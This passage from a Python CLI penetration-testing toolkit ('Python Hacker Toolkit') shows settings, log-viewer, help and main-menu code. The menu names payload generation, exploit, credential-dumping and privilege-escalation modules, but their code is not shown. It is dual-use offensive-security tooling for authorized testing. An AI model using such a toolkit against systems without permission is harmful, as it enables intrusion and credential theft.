            key = get_user_input("Enter API key:", password=True)
            if key:
                api_keys[service] = key
                config["api_keys"] = api_keys
                if save_config(config):
                    log_message(LogLevel.SUCCESS, f"API key for {service} saved")
    elif choice == 2:
        if not api_keys:
            log_message(LogLevel.WARNING, "No API keys to remove")
        else:
            services = list(api_keys.keys())
            for i, svc in enumerate(services, 1):
                console.print(f"{i}. {svc}")
            svc_choice = get_integer_input(
                "Select a service to remove:", 1, len(services)
            )
            if svc_choice:
                svc = services[svc_choice - 1]
                if get_confirmation(f"Remove API key for {svc}?"):
                    del api_keys[svc]
                    config["api_keys"] = api_keys
                    if save_config(config):
                        log_message(LogLevel.SUCCESS, f"API key for {svc} removed")
    elif choice == 3:
        if not api_keys:
            log_message(LogLevel.WARNING, "No API keys found")
        else:
            api_table = Table(
                title="API Keys",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            api_table.add_column("Service", style=f"bold {NordColors.FROST_2}")
            api_table.add_column("API Key", style=NordColors.SNOW_STORM_1)
            for service, key in api_keys.items():
                masked = (
                    key[:4] + "*" * (len(key) - 8) + key[-4:]
                    if len(key) > 8
                    else "****"
                )
                api_table.add_row(service, masked)
            console.print(api_table)
    input(f"\n[{NordColors.FROST_2}]Press Enter to return to settings...[/]")
    settings_module()


def view_logs_module() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "View application logs for debugging and auditing.",
        NordColors.UTILITIES,
        "Log Viewer",
    )
    log_files = sorted(
        list(AppConfig.LOG_DIR.glob("*.log")),
        key=lambda f: f.stat().st_mtime,
        reverse=True,
    )
    if not log_files:
        log_message(LogLevel.WARNING, "No log files found")
        input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
        return
    console.print(f"[bold {NordColors.FROST_2}]Available Log Files:[/]")
    for i, lf in enumerate(log_files, 1):
        size = lf.stat().st_size
        mtime = datetime.datetime.fromtimestamp(lf.stat().st_mtime).strftime(
            "%Y-%m-%d %H:%M:%S"
        )
        console.print(f"{i}. {lf.name} ({size} bytes, {mtime})")
    console.print("0. Return to Main Menu")
    choice = get_integer_input("Select a log file to view:", 0, len(log_files))
    if choice == 0:
        return
    selected = log_files[choice - 1]
    view_log_file(selected)
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def view_log_file(log_file: Path) -> None:
    try:
        with open(log_file, "r") as f:
            content = f.read()
        if content:
            panel = Panel(
                Text(f"Log File: {log_file.name}", style=f"bold {NordColors.FROST_2}"),
                border_style=NordColors.UTILITIES,
                title="Log Viewer",
                title_align="center",
            )
            console.print(panel)
            table = Table(
                show_header=True, header_style=f"bold {NordColors.FROST_1}", expand=True
            )
            table.add_column("Timestamp", style=f"bold {NordColors.FROST_3}")
            table.add_column("Level", style=f"bold {NordColors.FROST_2}")
            table.add_column("Message", style=NordColors.SNOW_STORM_1)
            for line in content.strip().split("\n"):
                parts = line.split(" - ", 2)
                if len(parts) >= 3:
                    ts, lvl, msg = parts
                    lvl_color = NordColors.FROST_2
                    if lvl == "ERROR":
                        lvl_color = NordColors.RED
                    elif lvl == "WARNING":
                        lvl_color = NordColors.YELLOW
                    elif lvl == "SUCCESS":
                        lvl_color = NordColors.GREEN
                    table.add_row(ts, f"[bold {lvl_color}]{lvl}[/]", msg)
                else:
                    table.add_row("", "", line)
            console.print(table)
        else:
            log_message(LogLevel.WARNING, "Log file is empty")
    except Exception as e:
        log_message(LogLevel.ERROR, f"Error reading log file: {e}")


def display_help() -> None:
    console.clear()
    console.print(create_header())
    display_panel("Help and Documentation", NordColors.UTILITIES, "Help Center")
    help_text = """
## Overview
Python Hacker Toolkit is a CLI tool for ethical hacking and penetration testing.
It provides modules for network scanning, OSINT, enumeration, payload generation,
exploitation simulation, credential dumping, privilege escalation assessment, and report generation.

## Modules
1. **Network Scanning**: Identify active hosts and open ports.
2. **OSINT Gathering**: Collect publicly available target information.
3. **Username Enumeration**: Check for usernames across platforms.
4. **Service Enumeration**: Gather service details and vulnerabilities.
5. **Payload Generation**: Create custom payloads.
6. **Exploit Modules**: Simulate exploitation of known vulnerabilities.
7. **Credential Dumping**: Simulate credential extraction.
8. **Privilege Escalation**: Identify vectors for escalation.
9. **Report Generation**: Produce detailed security reports.
10. **Settings**: Configure application settings and API keys.
11. **View Logs**: Review application logs.

## Disclaimer
Use this tool only on systems you have permission to test.
Unauthorized use is illegal and unethical.
"""
    console.print(Markdown(help_text))
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


# ----------------------------------------------------------------
# Signal Handling and Cleanup
# ----------------------------------------------------------------
def cleanup() -> None:
    log_message(LogLevel.INFO, "Cleaning up resources...")


def signal_handler(sig, frame) -> None:
    log_message(LogLevel.WARNING, f"Process interrupted by {signal.Signals(sig).name}")
    cleanup()
    sys.exit(128 + sig)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup)


# ----------------------------------------------------------------
# Main Menu and Entry Point
# ----------------------------------------------------------------
def display_main_menu() -> None:
    console.clear()
    console.print(create_header())
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    console.print(
        Align.center(
            f"[{NordColors.SNOW_STORM_1}]Time: {current_time}[/] | [{NordColors.SNOW_STORM_1}]Host: {AppConfig.HOSTNAME}[/]"
        )
    )
    console.print()
    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}", width=6)
    table.add_column("Module", style=NordColors.SNOW_STORM_1, width=30)
    table.add_column("Description", style=NordColors.SNOW_STORM_2)
    table.add_row(
        "1",
        f"[bold {NordColors.RECONNAISSANCE}]Network Scanning[/]",
        "Discover hosts, open ports and services",
    )
    table.add_row(
        "2",
        f"[bold {NordColors.RECONNAISSANCE}]OSINT Gathering[/]",
        "Collect public intelligence about targets",
    )
    table.add_row(
        "3",
        f"[bold {NordColors.ENUMERATION}]Username Enumeration[/]",
        "Check for username availability across platforms",
    )
    table.add_row(
        "4",
        f"[bold {NordColors.ENUMERATION}]Service Enumeration[/]",
        "Gather detailed service information",
    )
    table.add_row(
        "5",
        f"[bold {NordColors.EXPLOITATION}]Payload Generation[/]",
        "Create custom payloads",
    )
    table.add_row(
        "6",
        f"[bold {NordColors.EXPLOITATION}]Exploit Modules[/]",
        "Simulate exploitation of vulnerabilities",
    )
    table.add_row(
        "7",
        f"[bold {NordColors.POST_EXPLOITATION}]Credential Dumping[/]",
        "Simulate credential extraction",
    )
    table.add_row(
        "8",
        f"[bold {NordColors.POST_EXPLOITATION}]Privilege Escalation[/]",
        "Identify escalation vectors",
    )
    table.add_row(
        "9",
        f"[bold {NordColors.REPORTING}]Report Generation[/]",
        "Generate security reports",
    )
    table.add_row(
        "10",
        f"[bold {NordColors.UTILITIES}]Settings and Configuration[/]",
        "Configure settings and API keys",
    )
    table.add_row(
        "11", f"[bold {NordColors.UTILITIES}]View Logs[/]", "Review application logs"
    )
    table.add_row(
        "12", f"[bold {NordColors.UTILITIES}]Help[/]", "Display help and documentation"
    )
    table.add_row("0", "Exit", "Exit the application")
    console.print(table)


def main() -> None:
    try:
        log_message(
            LogLevel.INFO, f"Starting {AppConfig.APP_NAME} v{AppConfig.VERSION}"
        )
        while True:
            display_main_menu()
            choice = get_integer_input("Enter your choice:", 0, 12)
            if choice == 0:
                console.clear()
                console.print(
                    Panel(
                        Text(
                            "Thank you for using Python Hacker Toolkit!",
                            style=f"bold {NordColors.FROST_2}",
                        ),
                        border_style=NordColors.FROST_1,
                        padding=(1, 2),
                    )
                )
                log_message(LogLevel.INFO, "Exiting application")
                break
            elif choice == 1:
                network_scanning_module()
            elif choice == 2:
                osint_gathering_module()
            elif choice == 3:
                username_enumeration_module()
            elif choice == 4:
                service_enumeration_module()
            elif choice == 5:
                payload_generation_module()
            elif choice == 6:
                exploit_modules_function()
            elif choice == 7:
                credential_dumping_module()
            elif choice == 8:
                privilege_escalation_module()
            elif choice == 9:
                report_generation_module()
            elif choice == 10:
                settings_module()
            elif choice == 11:
                view_logs_module()
            elif choice == 12:
                display_help()
    except KeyboardInterrupt:
        log_message(LogLevel.WARNING, "Operation cancelled by user")
        display_panel("Operation cancelled", NordColors.YELLOW, "Cancelled")
        sys.exit(0)
    except Exception as e:
        log_message(LogLevel.ERROR, f"Unhandled error: {e}")
        display_panel(f"Unhandled error: {e}", NordColors.RED, "Error")
        console.print_exception()
        sys.exit(1)


if __name__ == "__main__":
    main()
